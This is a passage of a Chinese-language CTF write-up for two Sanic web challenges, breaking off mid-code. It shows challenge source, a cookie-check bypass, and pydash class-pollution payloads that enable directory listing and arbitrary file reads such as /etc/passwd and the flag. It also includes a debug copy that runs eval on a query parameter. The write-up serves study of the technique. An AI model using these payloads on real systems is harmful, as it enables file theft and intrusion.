class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sanic <span class="hljs-keyword">import</span> Sanic<br><span class="hljs-keyword">from</span> sanic.response <span class="hljs-keyword">import</span> text, html<br><span class="hljs-keyword">from</span> sanic_session <span class="hljs-keyword">import</span> Session<br><span class="hljs-keyword">import</span> pydash<br><span class="hljs-comment"># pydash==5.1.2</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Pollute</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br><br>app = Sanic(__name__)<br>app.static(<span class="hljs-string">&quot;/static/&quot;</span>, <span class="hljs-string">&quot;./static/&quot;</span>)<br>Session(app)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>(<span class="hljs-params">request</span>):<br>    <span class="hljs-keyword">return</span> html(<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;static/index.html&#x27;</span>).read())<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/login&quot;</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">request</span>):<br>    user = request.cookies.get(<span class="hljs-string">&quot;user&quot;</span>)<br>    <span class="hljs-keyword">if</span> user.lower() == <span class="hljs-string">&#x27;adm;n&#x27;</span>:<br>        request.ctx.session[<span class="hljs-string">&#x27;admin&#x27;</span>] = <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">return</span> text(<span class="hljs-string">&quot;login success&quot;</span>)<br><br>    <span class="hljs-keyword">return</span> text(<span class="hljs-string">&quot;login fail&quot;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/src&quot;</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">src</span>(<span class="hljs-params">request</span>):<br>    <span class="hljs-keyword">return</span> text(<span class="hljs-built_in">open</span>(__file__).read())<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/admin&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">admin</span>(<span class="hljs-params">request</span>):<br>    <span class="hljs-keyword">if</span> request.ctx.session.get(<span class="hljs-string">&#x27;admin&#x27;</span>) == <span class="hljs-literal">True</span>:<br>        key = request.json[<span class="hljs-string">&#x27;key&#x27;</span>]<br>        value = request.json[<span class="hljs-string">&#x27;value&#x27;</span>]<br>        <span class="hljs-keyword">if</span> key <span class="hljs-keyword">and</span> value <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(key) <span class="hljs-keyword">is</span> <span class="hljs-built_in">str</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;_.&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> key:<br>            pollute = Pollute()<br>            pydash.set_(pollute, key, value)<br>            <span class="hljs-keyword">return</span> text(<span class="hljs-string">&quot;success&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> text(<span class="hljs-string">&quot;forbidden&quot;</span>)<br><br>    <span class="hljs-keyword">return</span> text(<span class="hljs-string">&quot;forbidden&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>)<br></code></pre></td></tr></table></figure><p>这里我卡住的第一个点就是对于adm;n的校验（国赛我就卡在了这里）因为这个是cookie，而我们又知道cookie的分隔符就是;，那么这里我们需要利用RFC2068 的编码规则，对;进行八进制转化，也就是转化为<code>adm\073n</code>就可以了<br>我们先尝试一下<br><img src="/images/Pasted%20image%2020240722192644.png"><br>我们发现可以成功绕过，于是继续往下走，去污染，发现源码在这里过滤了_.的组合</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> key <span class="hljs-keyword">and</span> value <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(key) <span class="hljs-keyword">is</span> <span class="hljs-built_in">str</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;_.&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> key:<br></code></pre></td></tr></table></figure><p>所以我们可以使用<code>_\\\\.</code>去绕过，所以我们可以使用这个payload进行任意文件读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#123;&quot;key&quot;:&quot;.__init__\\\\.__globals__\\\\.__file__&quot;,&quot;value&quot;: &quot;/etc/passwd&quot;&#125;<br></code></pre></td></tr></table></figure><p>之后发现可以任意文件读取，但是无法知道flag的位置和文件名，尝试读取&#x2F;flag未果后猜测需要列举目录<br>看了gxn师傅的博客发现是需要看app.static这个注册路由的功能，源码如下<br><img src="/images/Pasted%20image%2020240722194244.png"><br>我们去看看下方的注释里怎么解释这几个参数的吧<br><img src="/images/Pasted%20image%2020240722194334.png"><br>这里需要让directory_view为True才能开启目录列举，而directory_handler可以指定列举的目录，于是我们继续跟进这里的directory_view<br><img src="/images/Pasted%20image%2020240722194622.png"><br>到了这里我们如何指定目录的方法也就明晰了，我们需要污染这里的directory和directory_view，前者为目录，后者为True，所以我们尝试看看怎么获取到static这个路由注册，这样我们就可以获取到我们想要的值<br>我们修改源码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sanic <span class="hljs-keyword">import</span> Sanic<br><span class="hljs-keyword">from</span> sanic.response <span class="hljs-keyword">import</span> text, html<br><span class="hljs-keyword">from</span> sanic_session <span class="hljs-keyword">import</span> Session<br><span class="hljs-keyword">import</span> pydash<br><span class="hljs-comment"># pydash==5.1.2</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Pollute</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br><br>app = Sanic(__name__)<br>app.static(<span class="hljs-string">&quot;/static/&quot;</span>, <span class="hljs-string">&quot;./static/&quot;</span>)<br><span class="hljs-comment"># Session(app)</span><br><br><br><span class="hljs-comment"># @app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="hljs-comment"># async def index(request):</span><br><span class="hljs-comment">#     return html(open(&#x27;static/index.html&#x27;).read())</span><br><br><br><span class="hljs-comment"># @app.route(&quot;/login&quot;)</span><br><span class="hljs-comment"># async def login(request):</span><br><span class="hljs-comment">#     user = request.cookies.get(&quot;user&quot;)</span><br><span class="hljs-comment">#     if user.lower() == &#x27;adm;n&#x27;:</span><br><span class="hljs-comment">#         request.ctx.session[&#x27;admin&#x27;] = True</span><br><span class="hljs-comment">#         return text(&quot;login success&quot;)</span><br><br><span class="hljs-comment">#     return text(&quot;login fail&quot;)</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/src&quot;</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">src</span>(<span class="hljs-params">request</span>):<br>    <span class="hljs-comment"># return text(open(__file__).read())</span><br>    <span class="hljs-built_in">eval</span>(request.args.get(<span class="hljs-string">&quot;fault&quot;</span>))<br>    <span class="hljs-keyword">return</span> text(<span class="hljs-built_in">open</span>(__file__).read())<br><br><br><span class="hljs-comment"># @app.route(&quot;/admin&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="hljs-comment"># async def admin(request):</span><br><span class="hljs-comment">#     if request.ctx.session.get(&#x27;admin&#x27;) == True:</span><br><span class="hljs-comment">#         key = request.json[&#x27;key&#x27;]</span><br><span class="hljs-comment">#         value = request.json[&#x27;value&#x27;]</span><br><span class="hljs-comment">#         if key and value and type(key) is str and &#x27;_.&#x27; not in key:</span><br><span class="hljs-comment">#             pollute = Pollute()</span><br><span class="hljs-comment">#             pydash.set_(pollute, key, value)</span><br><span class="hljs-comment">#             return text(&quot;success&quot;)</span><br><span class="hljs-comment">#         else:</span><br><span class="hljs-comment">#             return text(&quot;forbidden&quot;)</span><br><br><span class="hljs-comment">#     return text(&quot;forbidden&quot;)</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p>然后使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8000</span>/src?fault=<span class="hljs-built_in">print</span>(app.router.name_index)<br></code></pre></td></tr></table></figure><p>来列举注册过的路由，控制台回显如下<br><img src="/images/Pasted%20image%2020240722200202.png"><br>所以我们的名字就是</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">__mp_main__.<span class="hljs-type">static</span><br></code></pre></td></tr></table></figure><p>然后我们通过索引去访问键值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://127.0.0.1:8000/src?fault=print(app.router.name_index[%27__mp_main__.static%27])<br></code></pre></td></tr></table></figure><p><img src="/images/Pasted%20image%2020240722200334.png"><br>但是我们的目的是要修改directory和directory_view，那么我们怎么获取到他们呢<br>这里就用到了name_index，在这里打断点看看(这里强烈建议使用pycharm)<br><img src="/images/Pasted%20image%2020240722203749.png"><br>这里我们找到了self.name_index[name]&#x3D;route于是我们在这里下断点看看<br><img src="/images/Pasted%20image%2020240722203956.png"><br><img src="/images/Pasted%20image%2020240722204924.png"><br>我们发现handler可以获取到路由的状态，于是我们可以通过污染这个属性中的变量来达到我们方才分析的目的<br>于是我们接着尝试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://127.0.0.1:8000/src?fault=print(app.router.name_index[&quot;__mp_main__.static&quot;].handler.keywords[&quot;directory_handler&quot;])<br></code></pre></td></tr></table></figure><p><img src="/images/Pasted%20image%2020240722205432.png"><br>我们发现可以成功的调到这里，那么我们就可以通过污染它的值来进行利用<br>污染的payload如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#123;&quot;key&quot;:&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;,&quot;value&quot;: true&#125;<br><br></code></pre></td></tr></table></figure><p>（这里使用bp发包，也不知道我的hackbar有什么毛病）<br>发现回显为success，也就证明我们开启了目录列举功能<br>那么我们下一步的目标也很明确，就是污染到directory<br><img src="/images/Pasted%20image%2020240722211223.png"><br>我们尝试和刚才一样，直接污染directory，我们会发现方才的directory_view只是一个值，但是directory却是一个turple，所以我们没有办法直接去污染，我们找找看这个turple是在哪里被赋值的<br><img src="/images/Pasted%20image%2020240722212224.png"></p><p><img src="/images/Pasted%20image%2020240722212210.png"><br>我们可以看到，这个parts的值其实最后是给了_parts<br>于是我们访问这个值看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">print(app.router.name_index[&quot;__mp_main__.static&quot;].handler.keywords[&quot;directory_handler&quot;].directory._parts)<br></code></pre></td></tr></table></figure><p><img src="/images/Pasted%20image%2020240722212909.png"><br>这里可能会有疑问，就是为什么非要去找这个_parts不可，而不是直接去污染这个parts，那么我们就要提到python中最基础的问题，turple和list的区别，如果我们去访问parts这个值，我们会发现返回值如下<br><img src="/images/Pasted%20image%2020240722215443.png"><br>所以这也就是为什么我们需要找到_parts这个值不可了，一切的问题解决，我们的payload也呼之欲出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"><br>&#123;&quot;key&quot;:&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;,&quot;value&quot;: true&#125;<br><br><br>&#123;&quot;key&quot;:&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts&quot;,&quot;value&quot;: [&quot;/&quot;]&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/Pasted%20image%2020240722220557.png"><br>如果我们要得到flag文件，还需要进行一次污染</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"><br>&#123;&quot;key&quot;:&quot;__class__\\\\.__init__\\\\.__globals__\\\\.__file__&quot;,&quot;value&quot;: &quot;/24bcbd0192e591d6ded1_flag&quot;&#125;<br></code></pre></td></tr></table></figure><p>这样我们就可以在&#x2F;src路由中得到flag了</p><h2 id="DASCTF-2024-七月赛-web-Sanic’s-revenge"><a href="#DASCTF-2024-七月赛-web-Sanic’s-revenge" class="headerlink" title="DASCTF 2024 七月赛 web Sanic’s revenge"></a>DASCTF 2024 七月赛 web Sanic’s revenge</h2><p>这个题目是gxn师傅基于自己的另一个探索，也就是这道题的考点了<br>我们先看题目中可以直接获得的源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sanic <span class="hljs-keyword">import</span> Sanic<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> sanic.response <span class="hljs-keyword">import</span> text, html<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> pydash<br><span class="hljs-comment"># pydash==5.1.2</span><br><br><span class="hljs-comment"># 这里的源码好像被admin删掉了一些，听他说里面藏有大秘密</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Pollute</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br>app = Sanic(__name__)<br>app.static(<span class="hljs-string">&quot;/static/&quot;</span>, <span class="hljs-string">&quot;./static/&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/*****secret********&quot;</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">secret</span>(<span class="hljs-params">request</span>):<br>    secret=<span class="hljs-string">&#x27;**************************&#x27;</span><br>    <span class="hljs-keyword">return</span> text(<span class="hljs-string">&quot;can you find my route name ???&quot;</span>+secret)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>(<span class="hljs-params">request</span>):<br>    <span class="hljs-keyword">return</span> html(<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;static/index.html&#x27;</span>).read())<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/pollute&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">POLLUTE</span>(<span class="hljs-params">request</span>):<br>    key = request.json[<span class="hljs-string">&#x27;key&#x27;</span>]<br>    value = request.json[<span class="hljs-string">&#x27;value&#x27;</span>]<br>    <span class="hljs-keyword">if</span> key <span class="hljs-keyword">and</span> value <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(key) <span class="hljs-keyword">is</span> <span class="hljs-built_in">str</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;parts&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> key <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;proc&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(value) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(value) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">list</span>:<br>        pollute = Pollute()<br>        pydash.set_(pollute, key, value)<br>        <span class="hljs-keyword">return</span> text(<span class="hljs-string">&quot;success&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        log_dir = create_log_dir(<span class="hljs-number">6</span>)<br>        log_dir_bak = log_dir + <span class="hljs-string">&quot;..&quot;</span><br>        log_file = <span class="hljs-string">&quot;/tmp/&quot;</span> + log_dir + <span class="hljs-string">&quot;/access.log&quot;</span><br>        log_file_bak = <span class="hljs-string">&quot;/tmp/&quot;</span> + log_dir_bak + <span class="hljs-string">&quot;/access.log.bak&quot;</span><br>        log = <span class="hljs-string">&#x27;key: &#x27;</span> + <span class="hljs-built_in">str</span>(key) + <span class="hljs-string">&#x27;|&#x27;</span> + <span class="hljs-string">&#x27;value: &#x27;</span> + <span class="hljs-built_in">str</span>(value);<br>        <span class="hljs-comment"># 生成日志文件</span><br>        os.system(<span class="hljs-string">&quot;mkdir /tmp/&quot;</span> + log_dir)<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(log_file, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            f.write(log)<br>        <span class="hljs-comment"># 备份日志文件</span><br>        os.system(<span class="hljs-string">&quot;mkdir /tmp/&quot;</span> + log_dir_bak)<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(log_file_bak, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            f.write(log)<br>        <span class="hljs-keyword">return</span> text(<span class="hljs-string">&quot;！！！此地禁止胡来，你的非法操作已经被记录！！！&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>)<br></code></pre></td></tr></table></figure><p>这段源码不难审计，但是最重要的点就是我们需要对这个file_or_directory的源码的审计<br>我们继续去审计原来的代码</p><blockquote><p>疑问解答（感谢万能的晨曦✌）<br>Q:这个handle在哪儿调用了呀就要看这里<br>A:我们发现当用户请求一个目录，sanic路由系统匹配到静态文件服务路由，就会调用 <code>_static_request_handler</code>方法，这个方法中会调用handle方法，而执行这里<img src="/images/Pasted%20image%2020240722232106.png"><br>代码的要求是directory_view为true</p></blockquote><p>解决了这个问题，我们接下来看一些代码里的问题<br><img src="/images/Pasted%20image%2020240722234752.png"><br>如果directory_view是true，就会进入_index，我们去看看_index<br><img src="/images/Pasted%20image%2020240723000019.png"><br>前面的路径就是由directory+current拼接起来的<br>所以我们如果可以控制current的值，也就可以实现目录穿越了<br>那么我们来看看current的处理逻辑<br><img src="/images/Pasted%20image%2020240723000458.png"><br>它其实是依赖于base和path的，那么如果我们可以控制这俩，我们就可以控制current</p><h3 id="path"><a href="#path" class="headerlink" title="path"></a>path</h3><p>path来说，它就是我们网页访问的路径，是可控的</p><h3 id="base"><a href="#base" class="headerlink" title="base"></a>base</h3><p>base是属性，可以被污染，所以也是可控的<br>那么我们就可以做到控制current了</p><blockquote><p>举个栗子，比如说我的path是&#x2F;static&#x2F;fault..&#x2F;，base是&#x2F;static时，current是fault..，那么如果我让base是static&#x2F;fault，那么current就是..了</p></blockquote><p>&#x3D;&#x3D;所以结合题目情况的总的思路就是，先开启目录列举，再构造或者找出一个带..的path，然后污染base使得current为..，这样就可以穿越到上层目录中实现列目录了&#x3D;&#x3D;</p><p>那么我们结合这道题目来看的话，有两个容易卡住的点，一个就是waf不同于sanic，这道题的waf是这样的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> key <span class="hljs-keyword">and</span> value <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(key) <span class="hljs-keyword">is</span> <span class="hljs-built_in">str</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;parts&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> key <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;proc&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(value) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(value) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">list</span>:<br></code></pre></td></tr></table></figure><p>这道题的parts和proc是用来触发非法操作来让它记录的，这样我们就可以在adminLook中得到带有..的目录，从而构造出我们需要的current<br>第二个容易卡住的点就是如何才能知道需要列目录，这个就得用到file_or_directory比较简单的用法就是直接污染file_or_directory到根目录，这样就可以实现任意文件读取，通过读取proc&#x2F;1&#x2F;cmdline(梦回maple✌在我大一时候出的题)就可以找到start.sh从而找到python文件名，从而发现hint和完整python源码<br>完整源码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sanic <span class="hljs-keyword">import</span> Sanic<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> sanic.response <span class="hljs-keyword">import</span> text, html<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> pydash<br><br><span class="hljs-comment"># pydash==5.1.2</span><br><br><span class="hljs-comment">#源码好像被admin删掉了一些，听他说里面藏有大秘密</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Pollute</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_log_dir</span>(<span class="hljs-params">n</span>):<br>        ret = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>            num = random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">9</span>)<br>            letter = <span class="hljs-built_in">chr</span>(random.randint(<span class="hljs-number">97</span>, <span class="hljs-number">122</span>))<br>            Letter = <span class="hljs-built_in">chr</span>(random.randint(<span class="hljs-number">65</span>, <span class="hljs-number">90</span>))<br>            s = <span class="hljs-built_in">str</span>(random.choice([num, letter, Letter]))<br>            ret += s<br>        <span class="hljs-keyword">return</span> ret<br>        <br>app = Sanic(__name__)<br>app.static(<span class="hljs-string">&quot;/static/&quot;</span>, <span class="hljs-string">&quot;./static/&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/Wa58a1qEQ59857qQRPPQ&quot;</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">secret</span>(<span class="hljs-params">request</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/h111int&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>       hint=f.read()<br>    <span class="hljs-keyword">return</span> text(hint)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>(<span class="hljs-params">request</span>):<br>    <span class="hljs-keyword">return</span> html(<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;static/index.html&#x27;</span>).read())<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/adminLook&quot;</span>, 